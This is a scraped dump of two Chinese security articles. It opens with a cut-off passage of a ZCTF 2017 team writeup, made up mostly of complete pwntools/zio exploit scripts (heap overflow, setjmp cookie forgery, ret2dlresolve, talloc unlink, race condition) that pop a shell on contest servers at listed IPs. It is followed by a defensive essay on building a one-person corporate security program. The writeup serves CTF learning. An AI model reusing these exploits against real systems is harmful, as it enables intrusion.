""%9$p."".ljust(10, '-')        username = username.ljust(0x100-1, 'a')        password = """"    password += 'w' * 0x40        io.read_until("":"")    io.writeline(username)    io.read_until("":"")        #io.gdb_hint()    io.writeline(password)        io.read_until("""")    io.read_until(""Login successful!\n"")        io.read_until(""\n"")    data = io.read_until(""\n"")    print data    puts_addr = l32(data[:4])        offset_system = 0x3e800    offset_execve = 0xB59F0        #""""""    #remote    offset_system = 0x3fe70    offset_puts                = 0x64da0    offset_execve = 0xB4EA0    #""""""        libc_base = puts_addr - offset_puts    system_addr = libc_base + offset_system    execve_addr = libc_base + offset_execve        payload = """"    payload += l32(0x0)    payload += gen_rop_data(execve_addr, [bss_addr+0x100, 0, 0])    payload = payload.ljust(0x100, 'a')    payload += ""/bin/sh\x00""    payload += l8(0x1f)        io.gdb_hint()    io.writeline(payload)    io.interact()         io = get_io(target) pwn(io)Pwn-Dragon存在堆溢出，可以修改堆结构中的size.脚本如下：from pwn import *       #r = remote('58.213.63.30', 11501)    r = process(""./dragon"")       def add(size, name, content):     r.recvuntil('&gt;&gt;')     r.sendline('1')     r.recvuntil(':')     r.sendline(str(size))     r.recvuntil(':')     r.sendline(name)     r.recvuntil(':')     r.sendline(content)       def edit(id, content):     r.recvuntil('&gt;&gt;')     r.sendline('2')     r.recvuntil(':')     r.sendline(str(id))     r.recvuntil(':')     r.write(content)       def show(id):     r.recvuntil('&gt;&gt;')     r.sendline('4')     r.recvuntil(':')     r.sendline(str(id))       def delete(id):     r.recvuntil('&gt;&gt;')     r.sendline('3')     r.recvuntil(':')     r.sendline(str(id))         add(0x20, 'AAAA', 'AAAA') add(0x20, 'AAAA', 'A'*0x18) add(0x20, 'AAAA', 'A'*0x18)     edit(0, 'A'*0x18+p64(0xd1)) # note1   delete(1) add(0x20, 'AAAA', 'A'*0x18) strlen_got = 0x602028   add(0x10, 'AAAA', p64(strlen_got)+'d'*0x10) edit(3, p64(strlen_got)) #note2   show(2) r.recvuntil('content: ') strlen_addr = u64(r.readline()[:-1].ljust(8, '\x00'))   print ""[*] strlen addr:{0}"".format(hex(strlen_addr)) libc = ELF(""./libc-2.19.so"")#ELF(""/lib/x86_64-linux-gnu/libc.so.6"")   libc_base = strlen_addr - libc.symbols['strlen'] system_addr = libc_base + libc.symbols['system']  edit(2, p64(system_addr))     edit(0, '/bin/sh\x00') r.interactive()Pwn-Class在init函数中num*200+8存在整形溢出，num控制得当可以使得分配的空间很小。Setjmp会将当前的寄存器保存到堆上（部分寄存器进行了rol和异或加密）。通过show功能可以泄露出保存的寄存器值，通过edit功能可以修改这些值，然后通过longjmp改变程序的控制流程，因为rsp和rip都能被随意修改，所以比较容易进行rop。脚本：from threading import Threadfrom zio import *target = './class'target = ('58.213.63.30', 4001)  def interact(io):    def run_recv():        while True:            try:                output = io.read_until_timeout(timeout=1)                # print output            except:                return      t1 = Thread(target=run_recv)    t1.start()    while True:        d = raw_input()        if d != '':            io.writeline(d)  def rerol(d):    return ((d&lt;&lt;(64-0x11))+(d&gt;&gt;0x11))&amp;0xffffffffffffffff  def rol(d):    return ((d&lt;&lt;0x11) + (d&gt;&gt;(64-0x11)))&amp;0xffffffffffffffff  def show(io, id):    io.read_until('&gt;&gt;')    io.writeline('2')    io.read_until(':')    io.writeline(str(id))      io.read_until('name:')    r12 = l64(io.read_until(',')[:-1].ljust(8, '\x00'))    print 'r12', hex(r12)    io.read_until('addr:')    enc_rsp = l64(io.read(8))    enc_rip = l64(io.read_until(',')[:-1].ljust(8, '\x00'))      base = r12 - 0xaa0    print 'enc_rsp', hex(enc_rsp)    print 'enc_rip', hex(enc_rip)      real_rip = base + 0x1495    cookie = rerol(enc_rip)^real_rip      print 'cookie', hex(cookie)      real_rsp = rerol(enc_rsp)^cookie    print 'real_rsp', hex(real_rsp)      return (base, real_rsp, cookie)  def edit(io, id, age, name, addr, introduce):    io.read_until('&gt;&gt;')    io.writeline('3')    io.read_until(':')    io.writeline(str(id))    io.read_until(':')    io.writeline(name)    io.read_until(':')    io.writeline(str(age))    io.read_until(':')    io.writeline(addr)    io.read_until(':')    io.writeline(introduce)    def exp(target):    io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), \             print_write=COLORED(RAW, 'green'))      io.read_until(':')    io.writeline(str(92233720368547759))    base, rsp, cookie = show(io, 1)    print 'base', hex(base)      fake_rsp = rsp - 0x48    pop_rdi_ret = base + 0x000000000001523      addr = l64(rol(fake_rsp^cookie))+l64(rol(pop_rdi_ret^cookie))    print HEX(addr)    edit(io, 1, 0, """", addr, """")      io.read_until('&gt;&gt;')    payload = '5;'+'a'*6      puts_got = 0x0000000000202018+ base    puts_plt = 0x9a0 + base    main = base + 0x00000000000013ff    payload += l64(puts_got)+l64(puts_plt)+l64(main)    io.writeline(payload)      puts_addr = l64(io.readline()[:-1].ljust(8, '\x00'))    '''    base = puts_addr - 0x000000000006F5D0      system = base + 0x0000000000045380      print 'system', hex(system)    binsh = base + 0x000000000018C58B    '''      base = puts_addr - 0x000000000006FD60    print 'base', hex(base)    system = base + 0x0000000000046590    binsh = base + 0x000000000017C8C3      #io.gdb_hint()    io.read_until(':')    io.writeline(str(92233720368547759))        fake_rsp = rsp - 0x80      addr = l64(rol(fake_rsp^cookie))+l64(rol(pop_rdi_ret^cookie))    print HEX(addr)    io.gdb_hint()    edit(io, 1, 0, """", addr, """")      io.read_until('&gt;&gt;')    payload = '5;'+'a'*6      payload += l64(binsh)+l64(system)+l64(main)    io.writeline(payload)      #io.gdb_hint()    interact(io)  exp(target)Pwn-sandbox沙箱做了如下限制：对外的调用都通过jmp ds:dl_resolve出去，所以采用return-to-dlresolve进行利用。脚本：#encoding:utf-8import structfrom threading import Threadfrom zio import *    target = './sandbox ./vul'#target = './vul'target = ('58.213.63.30', 4004)  def interact(io):    def run_recv():        while True:            try:                output = io.read_until_timeout(timeout=1)                # print output            except:                return      t1 = Thread(target=run_recv)    t1.start()    while True:        d = raw_input()        if d != '':            io.writeline(d)  def write_16byte(io, addr, value):    io.write('a'*0x10+l64(addr+0x10)+l64(0x400582))    io.write(value+l64(0x601f00)+l64(0x400582))  fake_relro = ''fake_sym = ''  #link_map_addr = 0x00007ffff7ffe1c8 #close aslr.(if has aslr, need leak)  #link_map_addr = 0x7ffff7ffe168def generate_fake_relro(r_offset, r_sym):    return l64(r_offset) + l32(7)+l32(r_sym)+ l64(0)  def generate_fake_sym(st_name):    return l32(st_name)+l8(0x12)+l8(0) + l16(0) + l64(0) + l64(0)    #versym = 0x40031esymtab = 0x4002b8strtab = 0x400330jmprel = 0x4003b8  bss_addr = 0x601058  # .bss addr = 0x601058# 0x155dc*0x18+0x4003b8 = 0x601058# so index = 0x155dc  #0x155e8*0x18+0x4002b8 = 0x601078# so r_sym = 0x155e8  # 0x200d68 + 0x400330 = 0x601098# so st_name = 0x200d68    def write_any(io, addr, value):    print hex(addr), hex(value)    io.read_until(':\n')    io.writeline('0')    io.write(l64(addr)+l64(value))  def exp(target):    io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green'))    pop_rdi_ret = 0x0000000000400603    pop_rsi_r15_ret = 0x0000000000400601    leak_addr = 0x600ef0    write_plt = 0x0000000000400430    pop_rbp_ret = 0x4004d0    leak_rop = l64(pop_rsi_r15_ret) + l64(leak_addr) + l64(0) + l64(pop_rdi_ret) + l64(1) + l64(write_plt)    leak_rop += l64(pop_rbp_ret) + l64(0x601f00) + l64(0x400582)      for i in range(0, len(leak_rop), 8):        write_16byte(io, 0x601b00+i, leak_rop[i:i+8]+'\x00'*8)      leave_ret = 0x40059d    leak_stack_povit = 'a' * 0x10 + l64(0x601b00 - 0x8) + l64(leave_ret)    io.write(leak_stack_povit)      io.read_until(':')    link_map_addr = l64(io.read(8)) + 0x28    print hex(link_map_addr)      r_offset = 0x601970 # a writable addr    r_sym = 0x155e8      fake_relro = generate_fake_relro(r_offset, r_sym).ljust(0x20, '\x00')      st_name = 0x200d68    fake_sym = generate_fake_sym(st_name).ljust(0x20, '\x00')      write_16byte(io, link_map_addr+0x1c8, '\x00'*0x10)    #write_16byte(io, 0x600858, l64(0x6ffffff0)+l64(0x3d57d6))      for i in range(0, len(fake_relro), 8):        write_16byte(io, 0x601058+i, fake_relro[i:i+8]+'\x00'*8)    for i in range(0, len(fake_sym), 8):        write_16byte(io, 0x601078+i, fake_sym[i:i+8]+'\x00'*8)      write_16byte(io, 0x601098, 'system'.ljust(16, '\x00'))    write_16byte(io, 0x601a50, '/bin/sh'.ljust(16, '\x00'))      plt0 = 0x400420      rop = l64(pop_rdi_ret) + l64(0x601a50)    index = 0x155dc    rop += l64(plt0) + l64(index)      for i in range(0, len(rop), 8):        write_16byte(io, 0x601980+i, rop[i:i+8]+'\x00'*8)      stack_povit = 'a'*0x10 + l64(0x601980-0x8) + l64(leave_ret)    io.write(stack_povit)      interact(io)  exp(target)Pwn-note漏洞存在于edit中，有堆溢出。此题采用talloc，不过talloc_free内部会调用free函数，所以采用unlink方法进行利用。脚本：from threading import Threadfrom zio import *  target = ('119.254.101.197', 10000)target = './note'    def interact(io):    def run_recv():        while True:            try:                output = io.read_until_timeout(timeout=1)            except:                return      t1 = Thread(target=run_recv)    t1.start()    while True:        d = raw_input()        if d != '':            io.writeline(d)  def add(io, title, size, content):    io.read_until('&gt;&gt;')    io.writeline('1')    io.read_until(':')    io.writeline(title)    io.read_until(':')    io.writeline(str(size))    io.read_until(':')    io.writeline(content)  def edit(io, id, offset, content):    io.read_until('&gt;&gt;')    io.writeline('3')    io.read_until(':')    io.writeline(str(id))    io.read_until(':')    io.writeline(str(offset))    io.read_until("":"")    io.writeline(content)  def edit2(io, id, offset, content):    count = len(content)/48    print len(content)    print count    for i in range(count):        io.read_until('&gt;&gt;')        io.writeline('3')        io.read_until(':')        io.writeline(str(id))        io.read_until(':')        io.writeline(str(offset+48*i))        io.read_until("":"")        io.write(content[i*48:i*48+48])    if len(content[count*48:]) &gt; 0:        io.read_until('&gt;&gt;')        io.writeline('3')        io.read_until(':')        io.writeline(str(id))        io.read_until(':')        io.writeline(str(offset+48*count))        io.read_until(':')        io.writeline(content[count*48:])  def delete(io, id):    io.read_until('&gt;&gt;')    io.writeline('4')    io.read_until(':')    io.writeline(str(id))  def change(io, id, title):    io.read_until('&gt;&gt;')    io.writeline('5')    io.read_until(':')    io.writeline(str(id))    io.read_until(':')    io.writeline(title)  def exp(target):    io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), \             print_write=COLORED(RAW, 'green'))    add(io, '%13$p', 0x100, '111') #0x603070 0x603110   #0    add(io, '222', 0x100, '222') #0x603280 0x603320   #1    add(io, '333', 0x100, '333') #0x603490 0x603530   #2    add(io, '444', 0x100, '444') #0x6036a0 0x603740   #3    add(io, 'sh;', 0x100, '555') #0x6038b0 0x603950   #4    add(io, '666', 0x100, '666') #0x603ac0 0x603b60   #5      delete(io, 1)    delete(io, 2)      heap_ptr = 0x6020f0    payload = l64(0) + l64(0x211) +l64(heap_ptr-0x18)+l64(heap_ptr-0x10)    payload = payload[:-1]      add(io, payload[:-1], 0x300, '777') #0x603280 0x603320   #6    add(io, 'sh;', 0x100, '888')      #io.gdb_hint()      offset = 0x603490 - 0x603320    #                      size        next    prev     parent    fake_head1 = l64(0x210)+l64(0x90)+ l64(0) +l64(0)+ l64(0x603a60)                # child   refs  descutor   name      size       flags                   pool   padding    fake_head2 = l64(0)+l64(0)+l64(0)+l64(0x400dc4)+l64(0x100)+l64(0x00000000e8150c70)+l64(0)+l64(0)+l64(0)    fake_head2 = fake_head2.ljust(0x90-0x28, '\x00')    fake_head2 += l64(0) + l64(0x21) + '\x00'*0x10 + l64(0) + l64(0x21)      fake_head1 = fake_head1[:-6]    payload = '\x00' + l64(0)+l64(0xa1)+l64(0)+l64(0)+l64(0)+l64(0x6034a0)    payload = payload[:-6]    edit(io, 4, 0x100-1, payload)    edit2(io, 6, offset, fake_head1)    edit2(io, 6, offset+0x28, fake_head2)      delete(io, 5)      talloc_free_got = 0x602048    print_plt = 0x4007E0      title = l64(talloc_free_got) + l64(0) + l64(0) + l64(0x6020d0)    title = title[:-2]    change(io, 6, title)      change(io, 3, l64(print_plt)[:-1])      io.gdb_hint()    delete(io, 0)      io.read_until('0x')    main_ret = int(io.read_until('De')[:-2], 16)    base = main_ret - 0x0000000000021EC5    print hex(base)    system = base + 0x0000000000046640    print hex(system)      change(io, 3, l64(system)[:-1])      delete(io, 7)      interact(io)  exp(target)Pwn-Goodluck条件竞争漏洞，g_index的值可以在主线程中修改，然后在第2个子线程中能实现任意地址+1操作。read_int如果参数为0，可以栈溢出。脚本：from threading import Thread# from uploadflag import *from zio import *  target = ('119.254.101.197', 10000)target = './pwn2'    def add1(io,type,name,number,some):      io.read_until(""choice:"")      io.writeline('1')      io.read_until(""flower"")      io.writeline(str(type))      io.read_until('name:')      io.writeline(name)      io.read_until('number:')      io.writeline(str(number))      io.read_until('again:')      io.writeline(some)  def add2(io, type, name, much, price,   some):      io.read_until(""choice:"")      io.writeline('1')      io.read_until(""flower"")      io.writeline(str(type))      io.read_until('name:')      io.writeline(name)      io.read_until('want:')      io.writeline(much)      io.read_until('table:')      io.writeline(price)      io.read_until('something:')      io.writeline(some)  def show(io,index):      io.writeline('4')      io.read_until('show')      io.writeline(str(index))  def delete(io,index):      io.writeline('2')      io.read_until(cs7)      io.writeline(str(index))  def edit(io,index,data):      io.writeline('3')      io.read_until('edit:')      io.writeline(str(index))      io.read_until('something')      io.writeline(data)  def interact(io):      def run_recv():          while True:            try:                output =   io.read_until_timeout(timeout=1)                # print output            except:                return        t1 = Thread(target=run_recv)      t1.start()      while True:          d = raw_input()          if d != '':            io.writeline(d)    def exp(target):      io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), \             print_write=COLORED(RAW,   'green'))        add1(io, 3, 'bbbb', 100, 'ccccccccc')      fake_index = (0x2031a0 - 0x203180)/8      delete(io, 0)      delete(io, fake_index)      io.read_until('delete 0')      show(io, 0)      io.read_until('s1-&gt;')      data = io.read_until(' ')[:-1]      code_base = l64(data.ljust(8, '\x00')) - 0x1040      print hex(code_base)        canary_addr = code_base + 0x2031c0 + 1      add2(io, 2, 'aaaa', str(canary_addr&amp;0xffffffff),   str(canary_addr&gt;&gt;32), 'bbbbbbbb')        delete(io, 1)      delete(io, fake_index + 1)      io.read_until('delete 1')      show(io, 1)      io.read_until(""fake show!\n"")      cookies = l64(io.read_until('\n')[:-1].ljust(8, '\x00')) &lt;&lt; 8      print 'cookie', hex(cookies)        add1(io, 0, 'cccc',100, '0517')      io.gdb_hint()        show(io, 2)      io.read_until('again\n')        puts_plt = code_base + 0x0000000000000BC0      puts_got = code_base + 0x0000000000202F20      pop_rdi_ret = code_base + 0x0000000000001653      read_int = code_base + 0x0000000000000F80      payload = 'a'*0x18 + l64(cookies) + 'aaaaaaaa'*5 + l64(pop_rdi_ret) +   l64(puts_got) + l64(puts_plt) + l64(pop_rdi_ret)+l64(0) + l64(read_int)        io.writeline(payload)        puts = l64(io.readline()[:-1].ljust(8, '\x00'))      libc_base = puts - 0x000000000006F5D0        print hex(libc_base)      system = libc_base + 0x0000000000045380      binsh = libc_base + 0x000000000018C58B      payload = 'a'*0x18 + l64(cookies) + 'aaaaaaaa'*5 + l64(pop_rdi_ret) +   l64(binsh) + l64(system)        io.writeline(payload)        io.gdb_hint()      interact(io)    exp(target)","2017-02-28 12:54:03","CTF专题","第三届XCTF——郑州站ZCTF第一名战队Writeup","http://nsoad.com/Article/CTF/20170228/1086.html"
"5ccbf9d54f2f0a0a7a69bfcf","我在某教育公司负责公司整体安全，保护6000多万“熊孩子”的安全。","LionZ","*本文原创作者：LionZ，本文属FreeBuf原创奖励计划，未经许可禁止转载前言我在某教育公司负责公司整体安全，保护6000多万“熊孩子”的安全。一年半的时间从什么都没到现在的逐渐成型，此篇文章进行了一个总结，期间也碰到了的很多坑和坎，这里再次感谢帮助过我的朋友们，感谢MottoInTeam小伙伴。由于涉及到企业攻防，有些内容的细节部分这里不方便展开。对本篇文章有任何问题都可加我微信一起探讨WeChat:atiger77目录0×01. 情况概述    0×02. 运维安全    0×03. 业务安全    0×04. 应用安全    0×05. 内部安全    0×06. 总结0×01情况概述公司产品主要是一款教育类APP，后面我会分运维安全、业务安全、应用安全、内部安全和碰到的问题以及解决方法进行展开。如果你的公司像我一样只有一个人或者几个同学负责，我建议把重心都放在存在的安全问题上，比如业务场景中的薅羊毛，刷单等，用户模块的扫号，盗号，业务安全线的安全测试等。先处理这些直接会带来损失的安全问题再逐渐完善，一点点进行横纵向扩展。0×02 运维安全刚入职所在的公司因为没有安全部门，我是运维安全的岗位进入了运维部。我在原有的基础上又做了一些安全提升，这里提一点如果公司没有安全同学，对于运维同学而言，把控好安全基线也可以在一定程度上抵御一些攻击。devops里的一些运维自动化工具比如ansible, saltstack,puppet等，以ansible为列在初始化的role里就规定安全的基线，如：SSH禁止ROOT登录、修改SSH默认端口、禁止密码登录、新建普通用户、设置别名把“rm -rf”类似命令进行替换等等。保证交付给开发的机器都一样，比如软件的安装目录，由于历史原因有一些记录上的环境都是开发自己安装的，导致会出现很多个nginx目录，处理起来非常烦需要确定到底运行的是哪一个目录下的nginx才可以继续操作。当然建议公司使用堡垒机，上了之后对权限的管控对服务器的安全又可以提高一个保障，之前也调研过目前堡垒机情况，具体的可以细聊。除了服务器，数据库的初始化也同样重要，初始化只给开发普通帐号并赋予对应权限，设置连接白名单不允许非名单机器进行连接，密码一律多位数复杂密码。作为安全运维这块必须记录所以外网IP及对应端口，所以服务器对应的服务，由于每个公司情况不同，有些是安全部记录有些会是运维部把控，根据自己的情况来即可。a.         外网IP及对应开放端口除了解析商那里的记录自己必须保存一份最新的，之前碰到过一个情况自己在做外网IP扫描的时候发现有一个IP开放了一个端口，爆破发现使用了弱密码，平台的内容会对公司造成影响，先停止这个转发通知开发进行整改。对于这种情况有两点，一是严格把控要求外网IP的要求，对于一些敏感业务若没有经过安全测试不予提供外网访问。二是记录所有外网IP及开放端口情况，有相关自己平台的可以添加一页，没的话可以记录到confluence中即时更新。b.        服务器对应提供的服务这些年爆出了大大小小一堆的漏洞，每次收到还都是下班以后orz。具体漏洞修复方法这里就不具体阐述了，有兴趣可以看之前写的一篇文章：http://www.mottoin.com/92742.html每一次高危的漏洞都是对安全人员的一次考验，就是和时间赛跑晚一点服务就可能被黑，这里主要讲一下我从收到漏洞预警到处理的一个流程。获取漏洞信息可以多订阅一些高质量的公众号，加一些相关的安全群尽量第一时间              能知道哪个服务出了问题，收到的消息越早越是能给自己留多一点时间。确定漏洞影响范围&amp;严重性收到信息之后就要确认漏洞的影响和范围，这个服务公司是否部署，部署的是测试环境还是生产环境，分别有多少台，漏洞的触发条件是否苛刻，造成的影响有多大等问题，如果自己无法判断漏洞严重性的话可以多和朋友交流沟通，不要盲目的去修复升级，某些版本升级好性能兼容性可能会出现问题。对于影响范围之前也点到过必须记录服务器上部署的应用，在漏洞出现后可以快速定位而不是问开发你有没有部署xxx服务，我是记录在了运维的CMDB中内部测试我举两个漏洞为列， 一个脏牛漏洞，一个应用漏洞。脏牛漏洞的影响力不言而喻，除了本地使用容器服务的同学记得要把baseimage也做对应的升级。确定了严重性以后找出公网提供web服务的对应机器，先用长亭的方法做线上应急操作。然后找对应补丁对内网测试环境进行升级测试，由于是内核漏洞观测的时间比较长确定没问题在一点点的升级其他主机。某应用漏洞，由于这个服务不对外提供服务所以紧急程度没有脏牛来的这么紧，同样的找一台测试机器安装高版本确定不受影响后让测试同学帮忙做压测，看新版和旧版性能差异，如果没问题就上一个下一个直至全部升级完成。上线观测这里切记，并不是上线就没事了，上线之后必须再做一次复测确定没有问题并持续观察服务稳定性，做好随时回滚准备。0×03 业务安全只要公司到一定规模了都会碰到这些情况：扫号，撞库，垃圾注册，刷单，刷券，羊毛党，竞品攻击，DDOS等等。先说DDOS，根据一年的情况发现到年前年后，熊孩子开学，活动上线都是DDOS的高发期，对于流量攻击我们选择了一家做流量清洗业务的公司帮助我们做恶意流量的清洗，关于具体选型的话可以私聊。接着说一下对其他情况的处理，这些情况都是互联网公司常见的现象，只要规模上去了，有利益可以拿就会被攻击。想有效的去发现异常，阻断异常需要一个完善的风控平台，我讲一下我这边风控是怎么做的以及碰到的一些坑和对应接的方法。首先要知道做风控是为了解决已经出现的安全问题并能即时的阻断，刚开始做不要盲目的模仿大公司的玩法，大公司有自己专门的团队去做这个，盲目的模仿不但没解决问题反而起到了反作用，一开始做也别想着可视化，可视化是在功能都成型了要向上级展示的时候在考虑的东西。找到出现的问题，溯源问题的原因，并采取对应的策略。做风控必须要有数据，没有数据的支撑是无法做风控的。关于数据我的理解是这样：风控使用到的日志有别于BI日志和业务日志，安全日志是可分析异常用户行为，攻击趋势的增长情况，最后做到先于攻击者进行阻断保护系统安全稳定。在和公司相关同学沟通的时候他们也会问一些问题，我总结了下。Q：安全日志 和 应用日志 以及 BI日志 有什么区别？A： 共同点：三者都是记录业务产生的动作行为。       不同点：应用日志本身只是查业务是否正常性能是否达到预期，切重于业务本身。                     BI日志根据事前埋点收集用户行为进行分析为各个部门提供相关数据分析，如事件漏洞，转换率等等。                     安全日志主要记录安全相关信息，细化到哪一个用户在哪里用什么设备进行了什么动作并尝试了多少次，切重于业务安全。Q：有了BI日志还需要安全日志嘛？A：需要。首先BI日志目前没有涉及到公司所有业务，BI的日志并不是为了安全而生更重要的是为其他部分提供数据支撑，从而更好的掌握用户需求。安全日志和BI日志必然会产生交集，然而这并不冲突。对于风控策略而言安全日志是实时可查看的，第一时间可以知道当前时间的状态，BI日志是事后进行统计数据广度更大，两者结合更能保障业务的安全。Q：安全日志主要记录哪些内容？A： 安全日志需要记录谁在什么时候用了什么东西干了什么结果是怎么样，等一连串用户纬度指标。和相关同学都达成共识以后就可以开始执行了，我使用ELK对日志进行收集分析，logstash_agent把安全日志output到redis中，再由一台logstash_indexer取redis中的数据output到ES集群中，最后通过kibana进行展示（安全日志的格式，部署等细节可以私聊不占太多的字了）。有了数据以后通过kibana的聚合就可以发现异常的问题了，由于牵涉到相关数据我就不截图了，以用户模块为例就可以有很多的判断纬度，仔细观聚合后的数据就可以发现对应的安全问题，那么这些纬度大部分都是基于行为的判断，除了行为的还有基于特征的，比如用户的手机号是否执行过欺诈行为，我测试过某安的反欺诈产品结果还不错。以上这些都是不同的规则有基于行为的也有基于特征的，规则都是一个判断的纬度但不是触发了规则用户就一定不好，为了降低误杀率我们会给规则定分数，当一个用户总分到了阈值那么会直接对他做功能限制等操作，如果触发高危动作也会直接阻断，具体策略每个公司都不一样根据自己实际情况制定即可。如果有人力的话也可以把日志导入到Storm里根据自己的需求用bolt去做一些统计，要高可用的话推荐用flume+kafka+storm的架构去处理。我现在是使用Python去进行分析处理，根据自己情况选择一个合适的即可。当我这边的程序发现异常时会自动的给用户打上对应标签并同步到BI的系统中进行记录，同时为了不给客服同学带来压力这个标签也会同步到客服后台中方便她们进行查看。讲一下羊毛党，有了风控数据我发现每天都会有恶意注册，反溯这些帐号以后发现这些号里都有我们的活动券，根据活动券内容确定是哪个活动，询问相关产品活动规则策略，询问开发活动页的校验机制并自己黑盒在测试下，确定不是因为漏洞导致的就开始做自己的提升，风控就是一个攻防的对垒。     对应措施：a. 提高注册门槛；机器识别，人机对抗，验证码机制b. 修改产品策略；调整产品策略，c. 优化风控规则；异常情况短信认证，对抗羊毛党是个长期的过程，随着你的机制升级了，他的机制也会随之升级，就是成本和利益的问题，那对于甲方来说就是不断提高自己的门槛增加攻击的成本，把实惠给到真正的用户上。现在也有很多安全、风控团队在分享的时候会讲到机器学习，通过设定的模型来判断异常用户，但是具体分享细节的比较少，由于公司里很多机器学习方面的科学家，向他们学习以后我这里把我用到的一些机器学习方法和大家分享一下。我觉得在风控中机器学习的优势在于，基于大数据不断的提炼调优模型会越来越完善，可以通过训练后的模型找出一些规则没有命中的异常用户，在逐渐的完善规则。之前有看到过有同学用随机森林去判断异常流量的，我自己有一个模型是判断注册用户是否异常的，模型的分数如下：    可以看到模型跑出的分数很高，我的样本是根据规则判断的，所以最好的情况结果就是逼近规则，需要一直对模型进行迭代去提炼更多的规则，继续调优参数，让模型判断不单单限于几个限定的样本规则。0×04 应用安全由于只有一个人，SDL在公司很难去推行，快速迭代的版本上线每次检测到的漏洞一问都已经上线了好几个月，这也是挺被动的一点。开发的安全意识和水平都不一样，也出现过线上业务出现SQL注入的问题，我是搞过一次全员的技术分享，讲一下主流的一些WEB漏洞和一些逻辑漏洞，让开发有一个印象。我主要这样做记录开放公网的web服务每周都用扫描器去跑一次，对于大版本的升级我会自己再测一次。前段时间同程开源了一款内部漏扫工具-巡风挺不错的，也希望有越来越多的安全公司开源一些好的项目。备注项目地址： https://github.com/ysrc/xunfengMedicean Docker版本：https://github.com/Medicean/VulApps/tree/master/tools/xunfengAtiger77 Docker版本：https://github.com/atiger77/XunFeng_Docker详细介绍&amp;&amp;ubuntu安装方法可以看:http://www.mottoin.com/94253.html公司主要的产品是app，对于移动端的反编译这块我不是很熟悉找了一家公司做过渗透测试，测试下来也会发现一些问题，和公司安卓的老司机交流以后确定修复方案。端的东西加固就是让攻击者恶心，真的要破解理论上都是可以的毕竟所有人都可以下载研究，只是增加攻击者的破解成本。APP的反编译主要还是针对安卓，网络层面用https+ Pinning在一定程度上增加了抓包的成本（IOS市场将不再支持http协议的app，如果还没升https可以尽早升级），端的加固主要是保证apk不能被重打包，主代码做混淆，公共调用部分做人工混淆，so文件不允许被调用，不允许模拟器调试等等的加固手段。APP的升级不像网站，修复漏洞以后测试过就可以上线（有些框架支持动态更新），移动端会有版本问题，用户用着有问题的版本除非系统大的升级否则不会让用户进行强更（太影响用户体验了会导致用户流失）。对于APP的情况可以这么做，降低低版本的功能使用限制。对过低的版本使用人数也少的可以要求产品进行强制升级的操作。最后说一下数据存储问题，最近一直会流出被泄露的库有些库密码就是简单的Md5+salt，撞库一下就可以跑出大量的用户密码，无论是对企业还是用户都会造成伤害，有能力的话还是建议设计加解密服务专门有一台机器进行加解密计算，把用户的敏感信息（任何能联系上用户的信息都算敏感信息，不单单是密码）进行加密，这个我是没推成功，因为收益在不出事前很小甚至是没有，如果这个推送不动还可以推一下加密方案，关于加盐每个用户应该使用随机盐的方式进行加密存储，目前大部分的公司都是使用固定盐的方式来生成每个用户的密码。这个改的话都需要和业务方进行深入沟通，如果在项目刚启动需求讨论的时候就提出会很好，一旦项目起来了再改会比较困难。0×05 内部安全内部安全说两方面，一个是内部访问的一些系统比如XX后台，这种可以查看到敏感信息的平台。另一个讲一下人员的安全意识和办公网的安全。第一是内部的平台，重要的内部平台也需要做安全日志对于一些高危规则做到实时的报警，如果没有WAF的可以使用脚本简单模拟一下，比如单位时间内调用登录接口等行为做一个报警，设计到修改金额的面板必须做到实时的记录。含有查看用户信息功能的平台需要记录使用者的操作日志，方便做到审计，和开发同学确认做好权限把控，要对这些平台做好安全保障。对于数据库而言可以做蜜罐表，一旦有触发也立刻报警。内网可以部几台低交互的蜜罐挂着，之前有写过一个有需要的朋友拿来改改就能用https://github.com/atiger77/Dionaea。第二个是人员的安全意识，入职这家公司以后做的就是内部安全的提升，统计了下第三方对外的平台然后社工了下几个同学一个个破掉他们的帐号并发出邮件告知（授权行为进去截个图就可以了）。然后要求对所以外网的一些平台都要求二次认证。内部的话每次新同学入职都会加入网络安全，给他们讲讲一些常见的诈骗方法提高自身的安全意识。还有一个，定期扫github上的代码，发现有自家业务代码的直接让他下线，有时候也可以发现一些竞品公司写的代码，厉害了。0×06 总结我把这一年半的东西都简单概述了下，颗粒度再细的可以加我微信聊。总结了几点：1.  没有老板支持一切都是吹牛逼；从上往下推和从下往上推是两个概念；2.  先做最紧急的需求，全部解决以后再考虑可视化；东西丑不重要  关键是管用，东西再好看解决不了问题也是白搭；3.  必要时可考虑商业化产品/合作，如堡垒机，渗透测试等；4.  统计公司相关资源如外网IP,机器部署服务，别到了漏洞爆发在去问开发你的机器有没有部署XX服务；5.  做好外部控制别忘记做内控，有时候内部安全事件比外面攻击更可怕；6.多和公司老司机聊聊天，你碰到的一些坑他们可能也遇到过，一些架构上的设计、冗余、优化方案都可以多找他们讨论下；每个人的精力有限不可能什么都面面俱到，多和公司的老司机交流有些东西他们可能都接触过了，没事找他们吃吃饭交易交易会有意想不到的收获，比如告诉你Strom的任务优先级控制，架构的选型问题，机器学习的一些玩法等等。在没有人力的情况下不要一味地模仿大公司的玩法，找到自己公司出现的问题并着手解决，必要的时候可以借助外部的力量（前提是你公司有预算）。“你之所以看不见黑暗，是因为有人拼命把它挡在你看不见的地方。”向所有做安全的好同志致敬。","2017-02-06 20:13:56","安全管理","一个人的“安全部”","http://nsoad.com/news/securityissue/20170206/1049.html"
